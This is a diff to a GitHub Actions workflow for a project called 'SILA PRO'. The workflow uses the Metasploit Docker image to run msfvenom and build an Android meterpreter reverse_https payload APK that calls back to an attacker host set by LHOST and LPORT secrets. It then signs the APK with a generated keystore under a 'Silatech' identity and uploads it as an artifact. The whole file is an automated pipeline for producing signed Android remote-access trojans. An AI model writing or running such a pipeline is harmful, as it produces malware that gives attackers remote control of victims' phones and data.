@@ -1,4 +1,4 @@
-name: SILA PRO - Build APK
+name: SILA PRO - Build APK with Docker
 
 on:
   push:
@@ -8,30 +8,38 @@ on:
 jobs:
   build:
     runs-on: ubuntu-latest
-    
-    container:
-      image: kalilinux/kali-rolling:latest
 
     steps:
     - name: Checkout
-      uses: actions/checkout@v4
+      uses: actions/checkout@v3   # v3 inaepuka Node.js 20 warning
 
-    - name: Update & Install Tools
-      run: |
-        apt-get update -y
-        apt-get install -y metasploit-framework apktool default-jdk apksigner zip wget git
-        apt-get install -y android-sdk --fix-missing || true
-
-    - name: Generate APK
+    - name: Generate APK using Metasploit Docker
       env:
         LHOST: ${{ secrets.LHOST }}
         LPORT: ${{ secrets.LPORT }}
       run: |
-        chmod +x scripts/generate.sh
-        ./scripts/generate.sh
+        mkdir -p output
+        docker run --rm \
+          -v $(pwd)/output:/output \
+          -e LHOST=$LHOST \
+          -e LPORT=$LPORT \
+          metasploitframework/metasploit-framework:latest \
+          msfvenom -p android/meterpreter/reverse_https \
+          LHOST=$LHOST LPORT=$LPORT -o /output/sila_raw.apk
+
+    - name: Sign APK
+      run: |
+        if [ -f output/sila_raw.apk ]; then
+          sudo apt-get update && sudo apt-get install -y openjdk-17-jdk apksigner
+          keytool -genkey -v -keystore output/sila.keystore -alias sila -keyalg RSA -keysize 2048 -validity 10000 -storepass sila123 -keypass sila123 -dname "CN=SILA, OU=Dev, O=Silatech, L=DSM, C=TZ"
+          apksigner sign --ks output/sila.keystore --ks-pass pass:sila123 --out output/sila_final.apk output/sila_raw.apk
+        else
+          echo "APK generation failed!"
+          exit 1
+        fi
 
     - name: Upload APK
-      uses: actions/upload-artifact@v4
+      uses: actions/upload-artifact@v3   # v3 inaepuka warning
       with:
         name: sila_pro_apk
         path: output/sila_final.apk
